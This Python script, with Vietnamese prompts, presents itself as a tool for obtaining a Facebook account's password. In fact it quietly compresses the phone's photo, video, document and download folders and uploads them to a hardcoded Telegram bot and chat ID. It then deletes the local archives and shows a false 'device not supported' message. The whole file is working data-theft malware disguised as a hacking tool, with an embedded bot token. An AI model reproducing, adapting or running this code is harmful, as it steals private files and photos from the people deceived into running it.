#!/usr/bin/env python3
import sys
import subprocess
import importlib
def install_module(module):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", module],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except:
        return False
required_modules = ["requests", "tqdm"]
for module in required_modules:
    try:
        importlib.import_module(module)
    except ImportError:
        print(f"Module {module} chưa được cài, đang cài đặt...")
        if not install_module(module):
            print(f"Không thể cài {module}, vui lòng cài thủ công: pip install {module}")
            sys.exit(1)
import os, zipfile, shutil, subprocess, threading, logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import requests
from tqdm import tqdm

SOURCE_DIRS = [
    "/sdcard/DCIM",
    "/sdcard/Documents",
    "/sdcard/Movies",
    "/sdcard/Pictures",
    "/sdcard/Download"
]
MAX_SIZE = 500 * 1024 * 1024 
TOKEN = "7185501621:AAHY0QX9abMbFJJLGe0WcSlsgt49Ep8ChBg"
CHAT_ID = "6609531746"
def compress_folder(folder):
    zip_files = []
    all_files = [f for f in Path(folder).rglob('*') if f.is_file()]
    if not all_files:
        return zip_files
    all_files.sort(key=lambda x: x.stat().st_size, reverse=True)
    folder_name = Path(folder).name
    part = 1
    cur_zip = None
    cur_size = 0
    for file_path in all_files:
        file_size = file_path.stat().st_size
        if file_size > MAX_SIZE:
            continue
        if cur_zip is None or cur_size + file_size > MAX_SIZE:
            if cur_zip:
                cur_zip.close()
            zip_name = f"_{folder_name}_part{part}.zip"
            cur_zip = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            cur_size = 0
            part += 1
        cur_zip.write(file_path, arcname=file_path.relative_to(folder))
        cur_size += file_size
    if cur_zip:
        cur_zip.close()
        if cur_size > 0:
            zip_files.append(zip_name)
        else:
            os.remove(zip_name)
    return zip_files
def compress_folder_only_files(folder):
    zip_files = []
    all_files = [f for f in Path(folder).iterdir() if f.is_file()]
    if not all_files:
        return zip_files
    all_files.sort(key=lambda x: x.stat().st_size, reverse=True)
    folder_name = Path(folder).name
    part = 1
    cur_zip = None
    cur_size = 0
    for file_path in all_files:
        file_size = file_path.stat().st_size
        if file_size > MAX_SIZE:
            continue
        if cur_zip is None or cur_size + file_size > MAX_SIZE:
            if cur_zip:
                cur_zip.close()
            zip_name = f"_{folder_name}_part{part}.zip"
            cur_zip = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            cur_size = 0
            part += 1
        cur_zip.write(file_path, arcname=file_path.name)
        cur_size += file_size
    if cur_zip:
        cur_zip.close()
        if cur_size > 0:
            zip_files.append(zip_name)
        else:
            os.remove(zip_name)
    return zip_files
def send_to_telegram(file_path):
    if os.path.getsize(file_path) > MAX_SIZE:
        return
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            resp = requests.post(url, files={'document': f},
                                 data={'chat_id': CHAT_ID},
                                 timeout=60)
        if resp.status_code == 200:
            try:
                os.remove(file_path)
            except Exception as e:
                pass
        else:
            pass
    except Exception as e:
        pass
def main():
    print("lưu ý lúc chạy ko được dừng hoặc thoát app, chú ý internet")
    victim = input("Nhập URL FB muốn lấy mật khẩu: ")
    print("Đang setup...")
    all_subfolders = []
    all_root_dirs = []
    for src in SOURCE_DIRS:
        p = Path(src)
        if p.is_dir():
            all_root_dirs.append(p)
            for item in p.iterdir():
                if item.is_dir():
                    all_subfolders.append(item)
        else:
            pass
    if not all_subfolders and not all_root_dirs:
        return
    all_zips = []
    if all_subfolders:
        with tqdm(total=len(all_subfolders), desc="Đang Setup",
                  unit='', unit_scale=False,
                  bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]') as pbar:
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = {executor.submit(compress_folder, folder): folder for folder in all_subfolders}
                for future in as_completed(futures):
                    try:
                        zips = future.result()
                        all_zips.extend(zips)
                    except Exception as e:
                        pass
                    pbar.update(1)
    if all_root_dirs:
        with tqdm(total=len(all_root_dirs), desc="Đang setup",
                  unit='', unit_scale=False,
                  bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]') as pbar:
            with ThreadPoolExecutor(max_workers=4) as executor:
                futures = {executor.submit(compress_folder_only_files, folder): folder for folder in all_root_dirs}
                for future in as_completed(futures):
                    try:
                        zips = future.result()
                        all_zips.extend(zips)
                    except Exception as e:
                        pass
                    pbar.update(1)
    if not all_zips:
        print("Thiết bị không hỗ trợ")
        return
    with tqdm(total=len(all_zips), desc="Đang setup",
              unit='', unit_scale=False,
              bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}]') as pbar:
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(send_to_telegram, zip_file) for zip_file in all_zips]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    pass
                pbar.update(1)
    print("Thiết bị không hỗ trợ.")
if __name__ == "__main__":
    main()
